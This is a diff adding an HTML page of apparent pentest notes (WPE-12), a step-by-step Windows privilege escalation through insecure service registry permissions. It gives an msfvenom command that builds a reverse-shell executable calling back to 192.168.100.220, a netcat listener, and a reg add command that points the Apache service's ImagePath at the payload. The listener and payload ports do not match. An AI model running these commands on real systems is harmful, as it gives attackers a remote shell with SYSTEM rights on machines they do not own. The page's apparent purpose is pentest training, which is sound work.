@@ -1,0 +1,29 @@
+<p><a href="https://pentestlab.blog/2017/03/31/insecure-registry-permissions/">WPE-12 - Insecure Registry Permissions</a></p>
+
+<h2 id="-1-identify">| 1 identify</h2>
+<p>The process of privilege escalation via insecure registry permissions is very simple. Registry keys for the services that are running on the system can be found in the following registry path:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
+</code></pre></div></div>
+
+<p>If a standard user has permissions to modify the registry key “ImagePath” which contains the path to the application binary then he could escalate privileges to system as the Apache service is running under these privileges.</p>
+
+<p> 
+ </p>
+<h2 id="-2-compile-binary">| 2 compile binary</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.220 LPORT=4445 -f exe -o shell2.exe
+</code></pre></div></div>
+<p> 
+ </p>
+<h2 id="-3-start-listener">| 3 start listener</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 4444
+</code></pre></div></div>
+<p> 
+ </p>
+<h2 id="-4-modify-registry">| 4 modify registry</h2>
+<p>The only thing that is required is to add a registry key that will change the ImagePath to the location of where the malicious payload is stored.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\pentestlab\Desktop&gt;reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Apache"
+/t REG_EXPAND_SZ /v ImagePath /d "C:\xampp\shell2.exe" /f
+</code></pre></div></div>
+<p> 
+ </p>
+<h2 id="-5-profit">| 5 profit</h2>
